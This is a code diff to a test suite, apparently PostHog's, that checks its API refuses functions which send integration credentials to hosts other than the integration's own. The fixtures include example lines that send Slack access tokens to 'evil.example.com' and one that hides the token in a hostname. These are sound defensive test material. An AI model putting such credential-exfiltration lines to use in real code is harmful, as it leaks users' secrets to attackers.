@@ -23,11 +23,9 @@ from products.access_control.backend.models.access_control import AccessControl
 from products.actions.backend.facade.api import get_actions
 from products.actions.backend.facade.testing import create_action
 from products.cdp.backend.api.hog_function import (
-    INTEGRATION_ORIGIN_MESSAGE,
     MAX_HOG_CODE_SIZE_BYTES,
     MAX_LOG_TRANSFORMATIONS_PER_TEAM,
     MAX_TRANSFORMATIONS_PER_TEAM,
-    SECRET_REENTRY_MESSAGE,
     comparable_content,
 )
 from products.cdp.backend.api.test.secret_sender import (
@@ -112,6 +110,10 @@ SLACK_SENDER_HOG = (
 )
 SLACK_LEAKING_HOG = "fetch('https://evil.example.com', {'body': inputs.slack_workspace.access_token});"
 CONNECTION_LEAKING_HOG = "fetch('https://evil.example.com', {'body': inputs.conn});"
+SLACK_ONLY_MESSAGE = (
+    "Slack connections can only send credentials to slack.com. Remove the change that sends them anywhere else."
+)
+CONNECTION_TOKEN = "xoxb-connection-token"
 GITLAB_TOKEN_SENDER_HOG = "fetch(f'{inputs.conn.hostname}/api', {'body': inputs.token});"
 PUSH_SENDER_HOG = (
     "let res := sendPushNotification({'integrationIds': arrayMap(c -> c.$integration_id, inputs.channels), "
@@ -1843,7 +1845,31 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
                 },
                 "inputs__conn",
                 "integration_origin_refused",
-                INTEGRATION_ORIGIN_MESSAGE,
+                SLACK_ONLY_MESSAGE,
+            ),
+            (
+                "token_sent_inside_the_host",
+                None,
+                lambda ids: {
+                    "hog": "fetch(f'https://{inputs.conn.access_token}.example.com/a', {});",
+                    "inputs_schema": [{"key": "conn", "type": "integration", "integration": "slack"}],
+                    "inputs": {"conn": {"value": ids["slack"]}},
+                },
+                "inputs__conn",
+                "integration_origin_refused",
+                SLACK_ONLY_MESSAGE,
+            ),
+            (
+                "instance_connection_sent_elsewhere",
+                None,
+                lambda ids: {
+                    "inputs_schema": [{"key": "conn", "type": "integration", "integration": "gitlab"}],
+                    "inputs": {"conn": {"value": ids["gitlab"]}},
+                },
+                "inputs__conn",
+                "integration_origin_refused",
+                "This GitLab connection can only send credentials to git.example.com. "
+                "Remove the change that sends them anywhere else.",
             ),
             (
                 "mapping_value_for_a_top_level_connection",
@@ -1861,7 +1887,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
                 },
                 "inputs__conn",
                 "integration_origin_refused",
-                INTEGRATION_ORIGIN_MESSAGE,
+                SLACK_ONLY_MESSAGE,
             ),
             (
                 "schema_change_alone_makes_an_input_a_connection",
@@ -1872,7 +1898,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
                 lambda ids: {"inputs_schema": [{"key": "conn", "type": "integration", "integration": "slack"}]},
                 "inputs__conn",
                 "integration_origin_refused",
-                INTEGRATION_ORIGIN_MESSAGE,
+                SLACK_ONLY_MESSAGE,
             ),
             (
                 "schema_change_alone_moves_a_secret",
@@ -1893,7 +1919,8 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
                 },
                 "inputs__token",
                 "secret_reentry_required",
-                SECRET_REENTRY_MESSAGE,
+                "PostHog can't tell where this change sends token. Until now PostHog couldn't tell where it was sent. "
+                "Enter it again to confirm.",
             ),
             (
                 "secret_connection_moved_shows_the_integration_refusal",
@@ -1905,7 +1932,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
                 lambda ids: {"hog": CONNECTION_LEAKING_HOG},
                 "inputs__conn",
                 "integration_origin_refused",
-                INTEGRATION_ORIGIN_MESSAGE,
+                SLACK_ONLY_MESSAGE,
             ),
             (
                 "connection_of_another_kind_than_the_code_sends_to",
@@ -1917,7 +1944,8 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
                 lambda ids: {"inputs": {"conn": {"value": ids["hubspot"]}}},
                 "inputs__conn",
                 "integration_origin_refused",
-                INTEGRATION_ORIGIN_MESSAGE,
+                "HubSpot connections can only send credentials to api.hubapi.com. "
+                "Remove the change that sends them anywhere else.",
             ),
         ]
     )
@@ -1932,7 +1960,11 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
     ) -> None:
         ids = {
             kind: Integration.objects.create(
-                team=self.team, kind=kind, config=config, sensitive_config={"access_token": "t"}, created_by=self.user
+                team=self.team,
+                kind=kind,
+                config=config,
+                sensitive_config={"access_token": CONNECTION_TOKEN},
+                created_by=self.user,
             ).id
             for kind, config in [
                 ("slack", {}),
@@ -1963,6 +1995,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
             expected_code,
             expected_message,
         )
+        assert CONNECTION_TOKEN not in res.json()["detail"]
 
     @parameterized.expand(
         [
@@ -3519,7 +3552,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
                 "connection_sent_elsewhere",
                 "slack",
                 "fetch('https://evil.example.com', {'body': inputs.connection.access_token});",
-                "its own service",
+                SLACK_ONLY_MESSAGE,
             ),
         ]
     )
